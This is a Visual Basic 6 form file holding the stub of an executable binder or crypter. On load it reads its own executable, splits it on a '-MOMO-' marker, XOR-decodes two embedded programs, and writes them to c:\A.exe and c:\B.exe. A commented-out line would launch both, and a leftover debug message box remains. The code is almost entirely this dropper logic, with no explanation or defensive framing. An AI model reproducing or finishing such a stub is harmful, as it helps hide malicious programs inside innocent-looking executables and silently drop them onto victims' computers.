VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3120
   ClientLeft      =   60
   ClientTop       =   420
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3120
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Const Perculator = "-MOMO-"
Private Sub Form_Load()
Dim f1 As String, f2 As String, mAll As String, BBB() As String, mMe As String: mMe = App.Path & "\" & App.EXEName & ".exe"
Dim lenStub As String

Open mMe For Binary Access Read As #1: mAll = Space(LOF(1)): Get #1, , mAll: Close #1

        BBB = Split(mAll, Perculator)

f1 = BBB(1)
f2 = BBB(2)
f1 = Encr(f1, "x")
f2 = Encr(f2, "x")
lenStub = BBB(3)

        lenStub = lenStub + Len(Perculator)

MsgBox lenStub

Open "c:\A.exe" For Binary As #1: Put #1, , f1: Close #1
Open "c:\B.exe" For Binary As #2: Put #2, , f2: Close #2

Sleep (100)

'Shell "c:\A.exe": Shell "c:\B.exe": End
End Sub
 Function Encr(DataIn As String, CodeKey As String) As String
    Dim lonDataPtr As Long
    Dim strDataOut As String
    Dim intXOrValue1 As Integer, intXOrValue2 As Integer

    For lonDataPtr = 1 To Len(DataIn)
        intXOrValue1 = Asc(Mid$(DataIn, lonDataPtr, 1))
        intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        strDataOut = strDataOut + Chr$(intXOrValue1 Xor intXOrValue2)
    Next lonDataPtr
   Encr = strDataOut
End Function
